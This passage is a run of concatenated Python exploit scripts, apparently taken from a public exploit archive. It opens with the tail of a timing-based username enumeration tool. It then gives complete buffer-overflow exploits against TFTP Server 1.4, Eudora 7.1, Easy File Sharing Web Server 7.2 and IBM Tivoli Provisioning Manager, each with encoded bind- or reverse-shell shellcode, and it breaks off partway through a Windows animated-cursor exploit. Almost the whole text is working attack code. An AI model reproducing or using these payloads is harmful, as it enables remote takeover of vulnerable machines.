  if not args.silent: print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Baseline variation for host " + host + " is " + str(baseline_deviation) + " seconds.")
  upper = baseline_mean + float(args.factor) * baseline_deviation
  if not args.silent: print(bcolors.WARNING + "[*] " + bcolors.ENDC + "Defining timing of x < " + str(upper) + " as non-existing user.")
  if not args.silent: print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Testing your users...")
  # 
  # Get timing for the given user name...
  #
  for u in users:
    user = u.strip()
    enum_samples = []
    enum_mean = 0.0
    for t in range(0, int(args.trials)):
      timeval = connect(host, port, user)
      enum_samples.append(timeval)
    enum_mean = numpy.mean(numpy.array(enum_samples))
    if (enum_mean < upper):
      if not (args.enumerated or args.silent) : 
        print(bcolors.FAIL + "[-] " + bcolors.ENDC + user + " - timing: " + str(enum_mean))
    else:
      if not args.silent: 
        print(bcolors.OKGREEN + "[+] " + bcolors.ENDC + user + " - timing: " + str(enum_mean))
      else: 
        print(user)




if __name__ == "__main__":
  main()

# Exploit Title: [TFTP Server 1.4 - WRQ Buffer Overflow Exploit [Egghunter]]
# Exploit Author: [Karn Ganeshen]
# Vendor Homepage: [http://sourceforge.net/projects/tftp-server/]
# Version: [1.4]
# Tested on: [Windows Vista SP2]
#
# Coded this for Vista Ultimate, Service Pack 2
# 3-byte overwrite + short jump + Egghunter
# Standalone mode
#
# Couple of overflow exploits already here for this tftp, none for Vista SP2 + Egghunter:
#     http://www.exploit-db.com/exploits/5314/
#     http://www.exploit-db.com/exploits/10542/
#     http://www.exploit-db.com/exploits/5563/
#     https://www.exploit-db.com/exploits/18345/
#

#!/usr/bin/python

import socket
import sys

host = '192.168.49.187'
port = 69

try:
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
except:
print "socket() failed"
sys.exit(1)

# msfvenom -p windows/shell_bind_tcp LHOST=192.168.49.187 -b \x00 EXITFUNC=seh -f c -e x86/alpha_mixed
# Payload size: 718 bytes

shellcode = (
"\x89\xe5\xd9\xcf\xd9\x75\xf4\x5d\x55\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x59\x6c\x48\x68\x4f\x72\x75\x50\x63\x30\x33\x30\x33\x50\x6f"
"\x79\x59\x75\x35\x61\x6f\x30\x51\x74\x6c\x4b\x42\x70\x46\x50"
"\x6e\x6b\x62\x72\x66\x6c\x6c\x4b\x73\x62\x56\x74\x6c\x4b\x43"
"\x42\x45\x78\x66\x6f\x58\x37\x73\x7a\x56\x46\x54\x71\x4b\x4f"
"\x6e\x4c\x45\x6c\x50\x61\x51\x6c\x33\x32\x74\x6c\x61\x30\x4b"
"\x71\x68\x4f\x74\x4d\x63\x31\x39\x57\x58\x62\x68\x72\x76\x32"
"\x71\x47\x4e\x6b\x52\x72\x64\x50\x4c\x4b\x30\x4a\x45\x6c\x6c"
"\x4b\x30\x4c\x36\x71\x50\x78\x68\x63\x70\x48\x76\x61\x6b\x61"
"\x43\x61\x4e\x6b\x61\x49\x45\x70\x63\x31\x48\x53\x4c\x4b\x72"
"\x69\x35\x48\x38\x63\x77\x4a\x77\x39\x6c\x4b\x65\x64\x4c\x4b"
"\x67\x71\x58\x56\x75\x61\x4b\x4f\x6c\x6c\x69\x51\x7a\x6f\x76"
"\x6d\x65\x51\x39\x57\x45\x68\x4d\x30\x34\x35\x6a\x56\x45\x53"
"\x53\x4d\x5a\x58\x47\x4b\x53\x4d\x77\x54\x43\x45\x4d\x34\x73"
"\x68\x6c\x4b\x61\x48\x57\x54\x46\x61\x6b\x63\x61\x76\x6c\x4b"
"\x74\x4c\x42\x6b\x4c\x4b\x30\x58\x57\x6c\x75\x51\x79\x43\x4c"
"\x4b\x33\x34\x6e\x6b\x46\x61\x4e\x30\x4b\x39\x73\x74\x56\x44"
"\x65\x74\x63\x6b\x43\x6b\x63\x51\x52\x79\x53\x6a\x66\x31\x59"
"\x6f\x6b\x50\x33\x6f\x33\x6f\x32\x7a\x6e\x6b\x35\x42\x78\x6b"
"\x4e\x6d\x43\x6d\x62\x48\x37\x43\x46\x52\x37\x70\x35\x50\x61"
"\x78\x72\x57\x64\x33\x45\x62\x71\x4f\x56\x34\x53\x58\x32\x6c"
"\x63\x47\x34\x66\x46\x67\x4b\x4f\x6a\x75\x4e\x58\x4e\x70\x43"
"\x31\x75\x50\x35\x50\x31\x39\x6f\x34\x72\x74\x70\x50\x55\x38"
"\x56\x49\x4f\x70\x30\x6b\x47\x70\x69\x6f\x48\x55\x71\x7a\x36"
"\x68\x51\x49\x70\x50\x4a\x42\x4b\x4d\x61\x50\x76\x30\x33\x70"
"\x36\x30\x35\x38\x69\x7a\x64\x4f\x59\x4f\x6b\x50\x39\x6f\x4b"
"\x65\x7a\x37\x73\x58\x43\x32\x63\x30\x56\x71\x71\x4c\x6c\x49"
"\x69\x76\x71\x7a\x64\x50\x53\x66\x72\x77\x73\x58\x4a\x62\x79"
"\x4b\x50\x37\x65\x37\x39\x6f\x6b\x65\x36\x37\x42\x48\x48\x37"
"\x4b\x59\x47\x48\x6b\x4f\x39\x6f\x4b\x65\x51\x47\x51\x78\x50"
"\x74\x5a\x4c\x65\x6b\x79\x71\x69\x6f\x6a\x75\x51\x47\x4f\x67"
"\x53\x58\x61\x65\x32\x4e\x32\x6d\x70\x61\x49\x6f\x69\x45\x61"
"\x78\x72\x43\x32\x4d\x30\x64\x43\x30\x4b\x39\x4a\x43\x70\x57"
"\x53\x67\x72\x77\x64\x71\x48\x76\x31\x7a\x52\x32\x42\x79\x52"
"\x76\x38\x62\x69\x6d\x65\x36\x4b\x77\x37\x34\x61\x34\x47\x4c"
"\x57\x71\x45\x51\x6c\x4d\x77\x34\x44\x64\x72\x30\x78\x46\x53"
"\x30\x67\x34\x33\x64\x32\x70\x70\x56\x73\x66\x42\x76\x62\x66"
"\x46\x36\x30\x4e\x63\x66\x46\x36\x42\x73\x62\x76\x52\x48\x71"
"\x69\x38\x4c\x35\x6f\x6e\x66\x79\x6f\x49\x45\x4c\x49\x4b\x50"
"\x52\x6e\x43\x66\x30\x46\x59\x6f\x54\x70\x62\x48\x34\x48\x6c"
"\x47\x35\x4d\x55\x30\x39\x6f\x38\x55\x4f\x4b\x59\x6e\x34\x4e"
"\x76\x52\x59\x7a\x73\x58\x6d\x76\x6c\x55\x4d\x6d\x4d\x4d\x4b"
"\x4f\x6e\x35\x47\x4c\x63\x36\x71\x6c\x45\x5a\x4f\x70\x49\x6b"
"\x59\x70\x74\x35\x76\x65\x4d\x6b\x50\x47\x32\x33\x32\x52\x30"
"\x6f\x62\x4a\x45\x50\x66\x33\x69\x6f\x4e\x35\x41\x41")

# PPR - 0x0040CC22 - in TFTPServerSP.exe
# 3-byte overwrite

jump_one = "\xEB\xDB\x90\x90" # negative jump back
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a" #WOOT
"\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x54\x30\x30\x57\x8b\xfa"
"\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

filename = "\x90"*734 + "T00WT00W" + shellcode + "\x90"*10 + egghunter + "\x90"*10 + jump_one + "\x22\xCC\x40"

mode = "netascii"

evil = "\x00\x02" + filename + "\x00" + mode + "\x00"

print "[*] Sending evil packet, ph33r"
s.sendto(evil, (host, port))
print "[*] Check port 4444 for bindshell"
#!/usr/bin/python
# Eudora 7.1 (IMAP FLAGS) 0day Remote SEH Overwrite PoC Exploit
# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
# Tested on Eudora 7.1.0.9 / 2k SP4 Polish
# Shellcode type: Windows Execute Command (calc.exe)
# Details:..
# Eudora --> SELECT IMBOX  ---------> IMAP server
# Eudora <-- FLAGS (\..AAAA...) <---- IMAP server
# FLAGS (\Answered \Flagged \Draft \Deleted \Seen hasatt + "A" * 1070
# 0x41414141  Pointer to next SEH record
# 0x41414141  SE handler
##

from thread import start_new_thread
from struct import pack
from string import find
from time import sleep
from socket import *

session_elements = (
'* OK IMAP4 ready\r\n',

'* CAPABILITY IMAP4 IMAP4rev1 ACL QUOTA LITERAL+ MAILBOX-REFERRALS NAMESPACE UIDP'
'LUS ID NO_ATOMIC_RENAME UNSELECT CHILDREN MULTIAPPEND BINARY SORT THREAD=ORDERED'
'SUBJECT THREAD=REFERENCES ANNOTATEMORE IDLE SASL-IR\r\n'
'00000 OK completed\r\n',

'00001 OK User logged in\r\n',

'* NAMESPACE (("INBOX." ".")) (("user." ".")) (("" "."))\r\n'
'00002 OK Completed\r\n',

'* LIST (\Noselect) "." ""\r\n'
'00003 OK Completed (0.000 secs 0 calls)\r\n',

'* LIST (\HasChildren) "." "INBOX"\r\n'
'00004 OK Completed (0.000 secs 3 calls)\r\n',

'* LIST (\HasChildren) "." "INBOX"\r\n'
'00005 OK Completed (0.000 secs 3 calls)\r\n',

'* FLAGS (\Answered \Flagged \Draft \Deleted \Seen hasatt%s)\r\n'
'* OK [PERMANENTFLAGS (\Answered \Flagged \Draft \Deleted \Seen hasatt \*)]\r\n'  
'* 1 EXISTS\r\n'
'* 0 RECENT\r\n'
'* OK [UIDVALIDITY 1180222864]\r\n'  
'* OK [UIDNEXT 2]\r\n'  
'* OK [NOMODSEQ] Sorry, modsequences have not been enabled on this mailbox\r\n'
'* OK [URLMECH INTERNAL]\r\n'
'00003 OK [READ-WRITE] Completed\r\n')

shellcode = (
# Restricted Characters: 0x0a, 0x0d, 0x20, 0x29, (0x60 .. 0x7B)
# EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com    
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
"\x42\x30\x42\x50\x42\x50\x4b\x58\x45\x44\x4e\x33\x4b\x48\x4e\x57"
"\x45\x50\x4a\x57\x41\x30\x4f\x4e\x4b\x38\x4f\x34\x4a\x31\x4b\x58"
"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x54\x4b\x38\x46\x43\x4b\x58"
"\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x35\x46\x42\x46\x30\x45\x57\x45\x4e\x4b\x38"
"\x4f\x45\x46\x52\x41\x50\x4b\x4e\x48\x56\x4b\x48\x4e\x50\x4b\x54"
"\x4b\x48\x4f\x45\x4e\x51\x41\x30\x4b\x4e\x4b\x58\x4e\x51\x4b\x48"
"\x41\x50\x4b\x4e\x49\x58\x4e\x55\x46\x52\x46\x50\x43\x4c\x41\x53"
"\x42\x4c\x46\x56\x4b\x38\x42\x34\x42\x33\x45\x38\x42\x4c\x4a\x47"
"\x4e\x50\x4b\x38\x42\x44\x4e\x50\x4b\x38\x42\x47\x4e\x41\x4d\x4a"
"\x4b\x48\x4a\x56\x4a\x30\x4b\x4e\x49\x30\x4b\x48\x42\x48\x42\x4b"
"\x42\x50\x42\x30\x42\x50\x4b\x38\x4a\x36\x4e\x43\x4f\x35\x41\x43"
"\x48\x4f\x42\x56\x48\x55\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x57"
"\x42\x35\x4a\x56\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x56\x4a\x49"
"\x50\x4f\x4c\x38\x50\x30\x47\x55\x4f\x4f\x47\x4e\x43\x46\x41\x36"
"\x4e\x36\x43\x36\x42\x50\x5a")

NEXT_SEH_RECORD = 0x909006EB  # JMP SHORT + 0x06
SE_HANDLER = 0x7CEA41D3       # POP POP RET (SHELL32.DLL / 2k SP4 Polish)

buf = "A" * 1062
buf += pack("<L", NEXT_SEH_RECORD)
buf += pack("<L", SE_HANDLER)
buf += "\x90" * 32
buf += shellcode

def AcceptConnect(cl, addr):
    print "Connection accepted from: %s" % (addr[0])
    try:
        for i in range(0, len(session_elements) - 1):
            cl.send(session_elements[i])
            response = cl.recv(256)
            retval = find(response, 'SELECT INBOX')
            if(retval != -1):
                cl.send(session_elements[7] % (buf))
                sleep(1)
                print "Done"
                break
        cl.close()        
    except Exception, err:
        print err

bind_addr = '0.0.0.0'
bind_port = 143        

s = socket(AF_INET, SOCK_STREAM)
s.bind((bind_addr, bind_port))
s.listen(1)
print "Listening on %s:%d..." % (bind_addr, bind_port)
while(1):
    cl, addr = s.accept()
    start_new_thread(AcceptConnect, (cl, addr,))

# EoF

# milw0rm.com [2007-05-30]
#!/usr/bin/python
# Exploit Title: Easy File Sharing Web Server 7.2 SEH Overflow with Egghunter
# Date: July 29, 2016
# Exploit Author: ch3rn0byl
# Vendor Homepage: http://www.sharing-file.com/
# Software Link: http://www.sharing-file.com/download.php
# Version: 7.2
# Tested on: Windows 7, 8, 8.1, 10
# Admin privileges anyone?? hehe ;)

from socket import socket, AF_INET, SOCK_STREAM
from sys import argv
from struct import pack
from time import sleep
from subprocess import call

host = argv[1]

rekt =  ""
rekt += "\x93\x93\x48\xf5\x93\x93\x90\xf9\x90\x37\x4a\x48\x90"
rekt += "\x99\x9b\x37\x98\x9f\xfc\xd6\xbd\x71\xab\x9a\xbc\xdb"
rekt += "\xd0\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x53\x31\x6f\x12"
rekt += "\x83\xef\xfc\x03\x1e\xa5\x78\x49\x1c\x51\xfe\xb2\xdc"
rekt += "\xa2\x9f\x3b\x39\x93\x9f\x58\x4a\x84\x2f\x2a\x1e\x29"
rekt += "\xdb\x7e\x8a\xba\xa9\x56\xbd\x0b\x07\x81\xf0\x8c\x34"
rekt += "\xf1\x93\x0e\x47\x26\x73\x2e\x88\x3b\x72\x77\xf5\xb6"
rekt += "\x26\x20\x71\x64\xd6\x45\xcf\xb5\x5d\x15\xc1\xbd\x82"
rekt += "\xee\xe0\xec\x15\x64\xbb\x2e\x94\xa9\xb7\x66\x8e\xae"
rekt += "\xf2\x31\x25\x04\x88\xc3\xef\x54\x71\x6f\xce\x58\x80"
rekt += "\x71\x17\x5e\x7b\x04\x61\x9c\x06\x1f\xb6\xde\xdc\xaa"
rekt += "\x2c\x78\x96\x0d\x88\x78\x7b\xcb\x5b\x76\x30\x9f\x03"
rekt += "\x9b\xc7\x4c\x38\xa7\x4c\x73\xee\x21\x16\x50\x2a\x69"
rekt += "\xcc\xf9\x6b\xd7\xa3\x06\x6b\xb8\x1c\xa3\xe0\x55\x48"
rekt += "\xde\xab\x31\xbd\xd3\x53\xc2\xa9\x64\x20\xf0\x76\xdf"
rekt += "\xae\xb8\xff\xf9\x29\xbe\xd5\xbe\xa5\x41\xd6\xbe\xec"
rekt += "\x85\x82\xee\x86\x2c\xab\x64\x56\xd0\x7e\x10\x5e\x77"
rekt += "\xd1\x07\xa3\xc7\x81\x87\x0b\xa0\xcb\x07\x74\xd0\xf3"
rekt += "\xcd\x1d\x79\x0e\xee\xf5\x4b\x87\x08\x9f\xbb\xc1\x83"
rekt += "\x37\x7e\x36\x1c\xa0\x81\x1c\x34\x46\xc9\x76\x83\x69"
rekt += "\xca\x5c\xa3\xfd\x41\xb3\x77\x1c\x56\x9e\xdf\x49\xc1"
rekt += "\x54\x8e\x38\x73\x68\x9b\xaa\x10\xfb\x40\x2a\x5e\xe0"
rekt += "\xde\x7d\x37\xd6\x16\xeb\xa5\x41\x81\x09\x34\x17\xea"
rekt += "\x89\xe3\xe4\xf5\x10\x61\x50\xd2\x02\xbf\x59\x5e\x76"
rekt += "\x6f\x0c\x08\x20\xc9\xe6\xfa\x9a\x83\x55\x55\x4a\x55"
rekt += "\x96\x66\x0c\x5a\xf3\x10\xf0\xeb\xaa\x64\x0f\xc3\x3a"
rekt += "\x61\x68\x39\xdb\x8e\xa3\xf9\xeb\xc4\xe9\xa8\x63\x81"
rekt += "\x78\xe9\xe9\x32\x57\x2e\x14\xb1\x5d\xcf\xe3\xa9\x14"
rekt += "\xca\xa8\x6d\xc5\xa6\xa1\x1b\xe9\x15\xc1\x09"

# Our tag is hive: \x68\x69\x76\x65

egghunter = ''
egghunter += '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c'
egghunter += '\x05\x5a\x74\xef\xb8\x68\x69\x76\x65\x8b\xfa\xaf\x75'
egghunter += '\xea\xaf\x75\xe7\xff\xe7'

crash = "A" * 4061
crash += pack('<L', 0x909006eb)
crash += pack('<L', 0x10019ce3)
crash += egghunter
crash += "D" * (5500 - 4061 - 8 - len(egghunter))

payload = 'GET {} HTTP/1.0\r\n\r\n'.format(crash)
payload += 'hivehive'
payload += rekt
payload += 'E' * (800 - len(rekt))

print '[+] Trying to exploit {}...'.format(host)

try:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((host, 80))
        print '[+] Sending payload...'
        s.send(payload)
        s.close()
        print '[+] Trying to connect to target...\n'
        try:
                sleep(2)
                call(['ncat', host, '54321'])
        except:
                print '[!] Whoops!! Something went wrong?'
except:
        print '[!] Whoops!! Something went wrong?'
finally:
        print '\n[+] I <3 SHELLS'#!/usr/bin/python
#
# IBM Tivoli Provisioning Manager PRE AUTH Remote Exploit
# http://dvlabs.tippingpoint.com/advisory/TPTI-07-05
# Tested on windows 2003 server SP0. 
# Coded by Mati Aharoni
# muts@offensive-security.com
# http://www.offensive-security.com/0day/ibm-ti-pro.py
# Notes:
# * Egghunter can take upto 5 minutes to find the shell.
#
# bt ~ # ./ibm-ti-pro.py 192.168.9.32
# [*] IBM Tivoli Provisioning Manager PRE AUTH Remote Exploit.
# [*] http://dvlabs.tippingpoint.com/advisory/TPTI-07-05
# [*] muts@offensive-security.com
#
# [*] Sending evil payload to 192.168.9.32:8080
# [*] Payload sent, egghunter can take upto 5 minutes to find the shell
# [*] Happy Hunting!
#
# bt ~ # nc -nv 192.168.9.32 4444
# WIN2K3STD.LOCAL [192.168.9.32] 4444 (krb524) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
# C:\WINDOWS\system32>

import socket
import os
import sys

def banner():
        print "\n[*] IBM Tivoli Provisioning Manager PRE AUTH Remote Exploit."
        print "[*] http://dvlabs.tippingpoint.com/advisory/TPTI-07-05"
        print "[*] muts@offensive-security.com"
 
if len(sys.argv)!=2:
        banner()
        print "[*] Usage: ibm-ti-pro.py <ip>\n"
        sys.exit(0)

#77E0211B   FFD4             CALL ESP Win2k SP0
banner()
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect ( ( sys.argv[1], 8080 ) )

# Payload #1
sc = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# Payload #2
# win32_bind -  LPORT=4444 Encoder=PexAlphaNum http://metasploit.com

bindshell =("\x54\x30\x30\x57\x54\x30\x30\x57"
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
"\x4f\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x58"
"\x4e\x56\x46\x32\x46\x32\x4b\x38\x45\x44\x4e\x43\x4b\x58\x4e\x47"
"\x45\x50\x4a\x57\x41\x50\x4f\x4e\x4b\x38\x4f\x34\x4a\x41\x4b\x58"
"\x4f\x55\x42\x52\x41\x30\x4b\x4e\x43\x4e\x42\x53\x49\x54\x4b\x38"
"\x46\x53\x4b\x58\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a"
"\x46\x58\x42\x4c\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x30"
"\x44\x4c\x4b\x4e\x46\x4f\x4b\x33\x46\x55\x46\x42\x4a\x42\x45\x57"
"\x43\x4e\x4b\x58\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x58"
"\x4e\x50\x4b\x34\x4b\x48\x4f\x55\x4e\x41\x41\x30\x4b\x4e\x43\x30"
"\x4e\x52\x4b\x48\x49\x38\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c"
"\x41\x43\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x33\x4b\x58\x42\x44"
"\x4e\x50\x4b\x38\x42\x47\x4e\x41\x4d\x4a\x4b\x48\x42\x54\x4a\x50"
"\x50\x35\x4a\x46\x50\x58\x50\x44\x50\x50\x4e\x4e\x42\x35\x4f\x4f"
"\x48\x4d\x41\x53\x4b\x4d\x48\x36\x43\x55\x48\x56\x4a\x36\x43\x33"
"\x44\x33\x4a\x56\x47\x47\x43\x47\x44\x33\x4f\x55\x46\x55\x4f\x4f"
"\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e\x4e\x4f\x4b\x53\x42\x45\x4f\x4f"
"\x48\x4d\x4f\x35\x49\x48\x45\x4e\x48\x56\x41\x48\x4d\x4e\x4a\x50"
"\x44\x30\x45\x55\x4c\x46\x44\x50\x4f\x4f\x42\x4d\x4a\x36\x49\x4d"
"\x49\x50\x45\x4f\x4d\x4a\x47\x55\x4f\x4f\x48\x4d\x43\x45\x43\x45"
"\x43\x55\x43\x55\x43\x45\x43\x34\x43\x45\x43\x34\x43\x35\x4f\x4f"
"\x42\x4d\x48\x56\x4a\x56\x41\x41\x4e\x35\x48\x36\x43\x35\x49\x38"
"\x41\x4e\x45\x49\x4a\x46\x46\x4a\x4c\x51\x42\x57\x47\x4c\x47\x55"
"\x4f\x4f\x48\x4d\x4c\x36\x42\x31\x41\x45\x45\x35\x4f\x4f\x42\x4d"
"\x4a\x36\x46\x4a\x4d\x4a\x50\x42\x49\x4e\x47\x55\x4f\x4f\x48\x4d"
"\x43\x35\x45\x35\x4f\x4f\x42\x4d\x4a\x36\x45\x4e\x49\x44\x48\x38"
"\x49\x54\x47\x55\x4f\x4f\x48\x4d\x42\x55\x46\x35\x46\x45\x45\x35"
"\x4f\x4f\x42\x4d\x43\x49\x4a\x56\x47\x4e\x49\x37\x48\x4c\x49\x37"
"\x47\x45\x4f\x4f\x48\x4d\x45\x55\x4f\x4f\x42\x4d\x48\x36\x4c\x56"
"\x46\x46\x48\x36\x4a\x46\x43\x56\x4d\x56\x49\x38\x45\x4e\x4c\x56"
"\x42\x55\x49\x55\x49\x52\x4e\x4c\x49\x48\x47\x4e\x4c\x36\x46\x54"
"\x49\x58\x44\x4e\x41\x43\x42\x4c\x43\x4f\x4c\x4a\x50\x4f\x44\x54"
"\x4d\x32\x50\x4f\x44\x54\x4e\x52\x43\x49\x4d\x58\x4c\x47\x4a\x53"
"\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x46\x44\x57\x50\x4f\x43\x4b\x48\x51"
"\x4f\x4f\x45\x57\x46\x54\x4f\x4f\x48\x4d\x4b\x45\x47\x35\x44\x35"
"\x41\x35\x41\x55\x41\x35\x4c\x46\x41\x50\x41\x35\x41\x45\x45\x35"
"\x41\x45\x4f\x4f\x42\x4d\x4a\x56\x4d\x4a\x49\x4d\x45\x30\x50\x4c"
"\x43\x35\x4f\x4f\x48\x4d\x4c\x56\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f"
"\x42\x4d\x4b\x58\x47\x45\x4e\x4f\x43\x38\x46\x4c\x46\x36\x4f\x4f"
"\x48\x4d\x44\x55\x4f\x4f\x42\x4d\x4a\x36\x4f\x4e\x50\x4c\x42\x4e"
"\x42\x36\x43\x55\x4f\x4f\x48\x4d\x4f\x4f\x42\x4d\x5a")

print "[*] Sending evil payload to "+sys.argv[1] +":8080"
expl.send ( 'GET /' + '\x41'*131 +bindshell+'\x1b\x21\xe0\x77'+'\x90'*8 +sc +'\xcc'*500+'.exe HTTP/1.0\r\n\r\n\r\n')
print "[*] Payload sent, egghunter can take upto 5 minutes to find the shell"
print "[*] Happy Hunting!"
expl.close()

# milw0rm.com [2007-06-03]
#!/usr/bin/env python

#
#   $Id: win32-loadaniicon.py 4 2007-06-02 00:47:59Z ramon $
#
#   Windows Animated Cursor Stack Overflow Exploit
#   Copyright 2007 Ramon de Carvalho Valle <ramon@risesecurity.org>,
#   RISE Security <contact@risesecurity.org>
#
#   This program is free software; you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation; either version 2 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program; if not, write to the Free Software
#   Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
#

#
# Windows Animated Cursor Stack Overflow Vulnerability
# http://www.determina.com/security.research/vulnerabilities/ani-header.html
#

from BaseHTTPServer import *
from os.path import *
from random import *
from socket import *
from string import *
from struct import *
from sys import *

#
#  windows/shell_reverse_tcp - 287 bytes
#  http://www.metasploit.com
#  EXITFUNC=seh, LPORT=1234, LHOST=127.0.0.1
#
buf = \
'\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b' + \
'\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01' + \
'\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07' + \
'\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f' + \
'\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b' + \
'\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c' + \
'\x8b\x70\x1c\xad\x8b\x40\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff' + \
'\xd6\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\xff\xd0' + \
'\x68\xcb\xed\xfc\x3b\x50\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08' + \
'\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53' + \
'\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68\x7f\x00\x00\x01\x66' + \
'\x68\x04\xd2\x66\x53\x89\xe1\x95\x68\xec\xf9\xaa\x60\x57\xff' + \
'\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68\x63\x6d\x6a' + \
'\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3\xaa\x95' + \
'\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab\x68' + \
'\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51' + \
'\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff' + \
'\xd6\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04' + \
'\xff\xd6\xff\x77\xfc\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6' + \
'\xff\xd0'

# Target list
target = [ \
    # call [ebx+4]

    # Microsoft Windows XP SP2 user32.dll (5.1.2600.2622) Multi Language
    {'addr': 0x25ba, 'len': 2, 'offset': 80},

    # Microsoft Windows XP SP2 user32.dll (5.1.2600.2180) Multi Language
    {'addr': 0x25d0, 'len': 2, 'offset': 80},

    # Microsoft Windows XP SP2 userenv.dll (5.1.2600.2180) English
    {'addr': 0x769fc81a, 'len': 4, 'offset': 80},

    # Microsoft Windows XP SP2 user32.dll (5.1.2600.2180) English
    # {'addr': 0x77d825d0, 'len': 4, 'offset': 80},

    # Microsoft Windows XP SP2 userenv.dll (5.1.2600.2180) Portuguese (Brazil)
    {'addr': 0x769dc81a, 'len': 4, 'offset': 80},

    # Microsoft Windows XP SP2 user32.dll (5.1.2600.2180) Portuguese (Brazil)
    # {'addr': 0x77d625d0, 'len': 4, 'offset': 80},

    # call [esi+4]

    # Microsoft Windows XP SP1a userenv.dll English
    {'addr': 0x75a758b1, 'len': 4, 'offset': 80},

    # Microsoft Windows XP SP1a shell32.dll English
    # {'addr': 0x77441a66, 'len': 4, 'offset': 80},

    # Microsoft Windows XP userenv.dll (5.1.2600.0) Portuguese (Brazil)
    {'addr': 0x75a4579b, 'len': 4, 'offset': 80},

    # Microsoft Windows XP shell32.dll (6.0.2600.0) Portuguese (Brazil)
    # {'addr': 0x77427214, 'len': 4, 'offset': 80},
]

# Target list index
